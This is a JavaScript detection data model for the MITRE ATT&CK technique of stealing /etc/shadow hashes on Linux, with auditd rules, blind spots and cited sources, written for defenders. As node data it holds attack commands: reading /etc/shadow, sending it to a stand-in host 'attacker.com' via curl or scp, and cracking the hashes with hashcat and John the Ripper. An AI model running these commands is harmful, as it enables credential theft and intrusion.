// T1003.008 — /etc/passwd and /etc/shadow — Detection Data Model
// Tactic: Credential Access

const model = {
  metadata: {
    tcode: "T1003.008",
    name: "/etc/passwd and /etc/shadow",
    tactic: "Credential Access",
    platform: "Linux",
    version: "v1.0",
  },

  detectNodeId: "ev_detect",

  layout: {
    svgWidth: 1000,
    svgHeight: 480,
    columns: [
      { label: "PREREQUISITE", x: 80 },
      { label: "ACCESS FILE",  x: 260 },
      { label: "DETECTION",    x: 450 },
      { label: "PREPARE",      x: 640 },
      { label: "CRACK",        x: 810 },
      { label: "OUTCOME",      x: 950 },
    ],
    separators: [170, 355, 545, 725, 880],
    annotations: [
      { text: "Offline cracking — no target artifacts", x: 810, y: 400, color: "#c62828", fontStyle: "italic" },
    ],
  },

  nodes: [
    { id: "root", label: "Root Access", sub: "or shadow group", x: 80, y: 230, r: 40, type: "source",
      tags: ["root", "shadow group", "sudo", "SUID exploit"],
      telemetry: [],
      api: "/etc/shadow readable only by root and shadow group · /etc/passwd world-readable",
      artifact: "Privileged access or shadow group membership on Linux host",
      desc: "/etc/shadow requires root or shadow group membership to read. /etc/passwd is world-readable but on modern systems only contains 'x' placeholder for passwords (actual hashes in shadow). Attacker may gain root via privilege escalation, SUID exploits, or sudo abuse.",
      src: "MITRE ATT&CK T1003.008; Linux shadow(5) man page" },

    { id: "cat_shadow", label: "cat /etc/shadow", sub: "Direct read", x: 260, y: 130, r: 36, type: "source",
      tags: ["cat /etc/shadow", "cp /etc/shadow", "Direct file read"],
      telemetry: ["auditd"],
      api: "cat /etc/shadow · cp /etc/shadow /tmp/ · head/tail /etc/shadow",
      artifact: "auditd: file read on /etc/shadow · bash history · process creation",
      desc: "Simplest method: directly read or copy /etc/shadow. Contains username, hashed password, and aging fields. Each line: username:$<algo>$<salt>$<hash>:lastchange:min:max:warn:inactive:expire. Algorithm IDs: $1$=MD5, $5$=SHA-256, $6$=SHA-512, $y$=yescrypt.",
      src: "MITRE T1003.008; shadow(5) man page" },

    { id: "exfil", label: "Exfiltrate", sub: "Copy off host", x: 260, y: 280, r: 34, type: "source",
      tags: ["scp", "curl", "base64 encode", "nc"],
      telemetry: ["auditd", "network"],
      api: "scp /etc/shadow attacker@host: · base64 /etc/shadow | curl -d @- attacker.com",
      artifact: "Network transfer of shadow file · auditd read + outbound connection",
      desc: "Attacker copies the shadow file off the target for offline cracking. Methods: scp/sftp, HTTP POST via curl, base64 encoding and paste, netcat. Some attackers modify only specific entries or extract specific accounts to minimize file size.",
      src: "MITRE T1003.008" },

    { id: "cat_passwd", label: "/etc/passwd", sub: "World-readable", x: 260, y: 410, r: 34, type: "source",
      tags: ["cat /etc/passwd", "World-readable", "User enumeration"],
      telemetry: [],
      api: "cat /etc/passwd — world-readable, contains usernames, UIDs, shells",
      artifact: "No detection for world-readable file · username enumeration",
      desc: "/etc/passwd is world-readable on all Linux systems. Provides usernames, UIDs, GIDs, home directories, and login shells. On legacy systems without shadow passwords, may contain actual password hashes. Modern systems store 'x' indicating shadow file usage. Used with unshadow tool to combine with shadow for cracking.",
      src: "MITRE T1003.008; passwd(5) man page" },

    { id: "ev_detect", label: "auditd", sub: "/etc/shadow read", x: 450, y: 230, r: 50, type: "detect",
      tags: ["auditd", "-w /etc/shadow", "AUDIT_READ", "File integrity"],
      telemetry: ["auditd"],
      api: "auditd: -w /etc/shadow -p r -k shadow_read · file integrity monitoring (AIDE/OSSEC)",
      artifact: "OPTIMAL: auditd file read on /etc/shadow by non-auth process · FIM alerts",
      desc: "OPTIMAL DETECTION NODE. (1) auditd file watch: '-w /etc/shadow -p r -k shadow_read' logs ALL reads to /etc/shadow. Filter out legitimate readers (login, sshd, passwd, su, sudo, pam). Non-authentication processes reading shadow = suspicious. (2) File integrity monitoring (AIDE, OSSEC, Tripwire) for access/modification. (3) bash_history auditing for 'cat /etc/shadow' commands.",
      src: "MITRE T1003.008; auditd documentation; CIS Benchmark Linux" },

    { id: "unshadow", label: "unshadow", sub: "Combine files", x: 640, y: 230, r: 36, type: "blind",
      tags: ["unshadow passwd shadow", "john format", "Combine for cracking"],
      telemetry: [],
      api: "unshadow /etc/passwd /etc/shadow > combined.txt — merges for John format",
      artifact: "⚠ Offline on attacker system — combines passwd + shadow for cracker input",
      desc: "BLIND SPOT. unshadow (part of John the Ripper) combines /etc/passwd and /etc/shadow into a single file in the format expected by password cracking tools. Runs on the attacker's system — zero target artifacts.",
      src: "John the Ripper — openwall.com/john" },

    { id: "hashcat", label: "hashcat", sub: "-m 1800 (SHA-512)", x: 810, y: 150, r: 36, type: "blind",
      tags: ["hashcat -m 1800", "SHA-512crypt", "-m 500 MD5crypt", "-m 7400 SHA-256crypt"],
      telemetry: [],
      api: "hashcat -m 1800 hashes.txt wordlist.txt — SHA-512crypt (default modern Linux)",
      artifact: "⚠ Offline GPU cracking · $6$ SHA-512 = 5000 rounds default · rate-limited",
      desc: "BLIND SPOT. hashcat cracks Linux password hashes offline. Mode 1800 for SHA-512crypt ($6$) — the default on modern Linux. 5000 rounds by default, making it slower than raw hashes but faster than DCC2. Other modes: 500 (MD5crypt $1$), 7400 (SHA-256crypt $5$).",
      src: "hashcat documentation; crypt(3) man page" },

    { id: "john", label: "John the Ripper", sub: "auto-detect", x: 810, y: 330, r: 36, type: "blind",
      tags: ["john hashes.txt", "Auto-detects format", "Rules/wordlists"],
      telemetry: [],
      api: "john combined.txt --wordlist=rockyou.txt — auto-detects hash algorithm",
      artifact: "⚠ Offline cracking · supports all Linux hash algorithms",
      desc: "BLIND SPOT. John the Ripper auto-detects Linux hash formats and cracks them using wordlists and rules. Supports incremental, wordlist, and rule-based modes. Typically used with the unshadow output file. Community rules enhance coverage.",
      src: "John the Ripper — openwall.com/john" },

    { id: "creds", label: "Plaintext", sub: "Passwords", x: 950, y: 230, r: 38, type: "source",
      tags: ["Local account passwords", "Root password", "Service accounts"],
      telemetry: [],
      api: "Cracked plaintext passwords for local Linux accounts",
      artifact: "Plaintext passwords → SSH lateral movement · su/sudo escalation · credential reuse",
      desc: "Cracked passwords enable: (1) SSH lateral movement to other systems with same credentials. (2) su/sudo privilege escalation if cracked user has sudo rights. (3) Credential stuffing against other services using password reuse. (4) Root password yields direct privilege escalation path.",
      src: "MITRE T1003.008" },
  ],

  edges: [
    { f: "root", t: "cat_shadow" },
    { f: "root", t: "exfil" },
    { f: "root", t: "cat_passwd" },
    { f: "cat_shadow", t: "ev_detect" },
    { f: "exfil", t: "ev_detect" },
    { f: "cat_shadow", t: "unshadow" },
    { f: "cat_passwd", t: "unshadow" },
    { f: "unshadow", t: "hashcat", blind: true },
    { f: "unshadow", t: "john", blind: true },
    { f: "hashcat", t: "creds", blind: true },
    { f: "john", t: "creds", blind: true },
  ],
};

export default model;
